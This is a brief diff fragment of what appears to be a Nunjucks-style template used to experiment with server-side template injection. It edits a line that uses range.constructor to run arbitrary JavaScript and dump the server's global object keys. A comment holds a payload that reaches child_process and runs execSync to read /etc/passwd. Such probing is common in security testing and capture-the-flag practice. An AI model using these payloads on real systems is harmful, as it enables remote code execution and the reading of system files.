@@ -11,7 +11,7 @@ HELLO??dddd
 values: ${{ values | dump }}
 
 keys:
-${{ range.constructor("return Object.keys(global)")() }}
+${{ range.constructor("return Object.keys(global)")() | dump}}
 
 // range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()
 
